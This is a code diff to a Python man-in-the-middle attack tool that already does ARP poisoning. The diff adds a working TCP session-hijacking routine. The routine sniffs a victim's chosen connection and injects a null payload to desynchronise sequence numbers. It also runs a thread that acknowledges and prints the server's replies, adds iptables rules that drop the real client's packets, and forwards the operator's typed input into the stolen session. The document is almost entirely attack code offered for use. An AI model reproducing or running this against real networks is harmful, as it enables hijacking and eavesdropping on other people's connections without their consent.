@@ -17,7 +17,10 @@
 
 """ Mitm main module, contains classes responsible for the attacks """
 
+import os
 import re
+import sys
+import struct
 import time
 import logging as log
 from socket import socket, inet_ntoa, gethostbyname, PF_PACKET, SOCK_RAW
@@ -172,7 +175,7 @@ class Mitm(object):
             self.restore(2)
             utils.set_ip_forward(0)
 
-    def list_sessions(self, port=None):
+    def list_sessions(self, stop, port=None):
         """
         Try to get all TCP sessions of the target
         """
@@ -210,6 +213,8 @@ class Mitm(object):
         sessions = {}
         try:
             for _, pkt in packets:
+                if stop():
+                    break
                 eth = dpkt.ethernet.Ethernet(pkt)
                 ip_packet = eth.data
                 if ip_packet.p == dpkt.ip.IP_PROTO_TCP:
@@ -223,7 +228,6 @@ class Mitm(object):
                             check = True
 
                         sessions[sess] = "Others"
-                        self.sessions.append(sess)
 
                         if tcp.sport in notorious_services:
                             sessions[sess] = notorious_services[tcp.sport]
@@ -232,6 +236,7 @@ class Mitm(object):
 
                         if check is True:
                             print(" [{:^5}] {} : {}".format(len(sessions), sess, sessions[sess]))
+                            self.sessions.append(sess)
 
         except KeyboardInterrupt:
             print('[+] Session scan interrupted\n\r')
@@ -313,18 +318,125 @@ class Mitm(object):
             utils.set_ip_forward(0)
 
     def hijack_session(self, port=None):
-        list_conn_thread = Thread(target=self.list_sessions, args=(port,))
+        stop_thread = False
+        list_conn_thread = Thread(target=self.list_sessions, args=(lambda: stop_thread, port,))
         list_conn_thread.start()
         choice = None
+        sock = socket(PF_PACKET, SOCK_RAW)
+        sock.bind((self.dev, dpkt.ethernet.ETH_TYPE_ARP))
         while True:
-            print(self.sessions)
-            choice = raw_input("sees")
+            choice = raw_input()
+            choice = int(choice) - 1
             if choice <= len(self.sessions) and choice > -1:
                 break
+        stop_thread = True
+        list_conn_thread.join()
         # must stop thread
-        src_ip, src_port, dst_ip, dst_port = re.search(r'^([0-9.]+):(\d+) <-> ([0-9.]+):(\d+)$/', self.sessions[choice])
+        src_ip, src_port, dst_ip, dst_port = re.search(r'^([0-9.]+):(\d+)\s+<->\s+([0-9.]+):(\d+)$', self.sessions[choice]).groups()
+        str_src_ip, str_src_port, str_dst_ip, str_dst_port = src_ip, src_port, dst_ip, dst_port
         print("\n[*] Hijacking: {}:{} --> {}:{}".format(src_ip, src_port, dst_ip, dst_port))
-        # pcap_filter = self._build_pcap_filter("src host {} and src port {} and dst host $hj_src_ip and dst port $hj_src_port and tcp".format(dst_ip, port))
+        pcap_filter = 'src host %s and src port %s and dst host %s and dst port %s and tcp' % (src_ip, src_port, dst_ip, dst_port)
+        packets = pcap.pcap(self.dev)
+        packets.setfilter(pcap_filter)
+        eth = None
+        for _, pkt in packets:
+            eth = dpkt.ethernet.Ethernet(pkt)
+            ip_packet = eth.data
+            tcp = ip_packet.data
+            if ip_packet.src == dst_ip:
+                src_port, dst_port = tcp.dport, tcp.sport
+            else:
+                src_port, dst_port = tcp.sport, tcp.dport
+            seq, ack, data = tcp.seq, tcp.ack, tcp.data
+            print('[*] SEQ: {}, ACK: {}'.format(seq, ack))
+            seq += len(data)
+            print('[*] Sending 1024 bytes nop payload.\n')
+            tcp_layer = dpkt.tcp.TCP(
+                sport=src_port,
+                dport=dst_port,
+                seq=seq,
+                ack=ack,
+                data='\x00' * 1024)
+            # build ip layer
+            ip_layer = dpkt.ip.IP(
+                src=src_ip,
+                dst=dst_ip,
+                data=tcp_layer)
+            # build ethernet layer
+            eth_layer = dpkt.ethernet.Ethernet(
+                dst=eth.dst,
+                src=eth.src,
+                type=eth.type,
+                data=ip_layer)
+
+            sock.send(str(eth_layer))
+            seq += 1024
+            print('[*] Desynchronization complete.')
+            break
+
+        def tcpdaemon(ack):
+            pcap_filter = 'src host %s and src port %s and dst host %s and dst port %s and tcp' % (str_dst_ip, str_dst_port, str_src_ip, str_src_port)
+            sock = socket(PF_PACKET, SOCK_RAW)
+            sock.bind((self.dev, dpkt.ethernet.ETH_TYPE_ARP))
+            packets = pcap.pcap(self.dev)
+            packets.setfilter(pcap_filter)
+            eth = None
+            for _, pkt in packets:
+                eth = dpkt.ethernet.Ethernet(pkt)
+                ip_packet = eth.data
+                tcp = ip_packet.data
+                if tcp.seq == ack:
+                    seq = tcp.ack
+                    if len(tcp.data) > 0:
+                        ack += len(tcp.data)
+                        tcp_layer = dpkt.tcp.TCP(
+                            sport=src_port,
+                            dport=dst_port,
+                            seq=seq,
+                            ack=ack)
+                        # build ip layer
+                        ip_layer = dpkt.ip.IP(
+                            src=src_ip,
+                            dst=dst_ip,
+                            data=tcp_layer)
+                        # build ethernet layer
+                        eth_layer = dpkt.ethernet.Ethernet(
+                            dst=eth.dst,
+                            src=eth.src,
+                            type=eth.type,
+                            data=ip_layer)
+
+                        sock.send(str(eth_layer))
+                        sys.stdout.write(tcp.data)
+
+        tcpdaemon_thread = Thread(target=tcpdaemon, args=(ack,))
+        tcpdaemon_thread.start()
+        os.system("/sbin/iptables -A FORWARD -s %s -p tcp --sport %s -j DROP" % (str_src_ip, str_src_port));
+        os.system("/sbin/iptables -A FORWARD -d %s -p tcp --dport %s -j DROP" % (str_src_ip, str_src_port));
+        print('[*] Session hijacked, everything you enter is sent through it.')
+
+        while True:
+            data = raw_input("> ")
+            tcp_layer = dpkt.tcp.TCP(
+                sport=src_port,
+                dport=dst_port,
+                seq=seq,
+                ack=1,
+                data=data)
+            # build ip layer
+            ip_layer = dpkt.ip.IP(
+                src=src_ip,
+                dst=dst_ip,
+                data=tcp_layer)
+            # build ethernet layer
+            eth_layer = dpkt.ethernet.Ethernet(
+                dst=eth.dst,
+                src=eth.src,
+                type=eth.type,
+                data=ip_layer)
+
+            sock.send(str(eth_layer))
+            seq += len(data)
 
     def poison(self, delay):
         """
@@ -543,3 +655,19 @@ class ScapyMitm(Mitm):
                          hwdst="ff:" * 5 + "ff", hwsrc=dst_mac), count=3, verbose=False)
                 send(ARP(op=2, pdst=addr, psrc=self.gateway,
                          hwdst="ff:" * 5 + "ff", hwsrc=self.src_mac), count=3, verbose=False)
+
+
+
+# class StoppableThread(Thread):
+#     """Thread class with a stop() method. The thread itself has to check
+#     regularly for the stopped() condition."""
+
+#     def __init__(self):
+#         super(StoppableThread, self).__init__()
+#         self._stop = threading.Event()
+
+#     def stop(self):
+#         self._stop.set()
+
+#     def stopped(self):
+#         return self._stop.isSet()
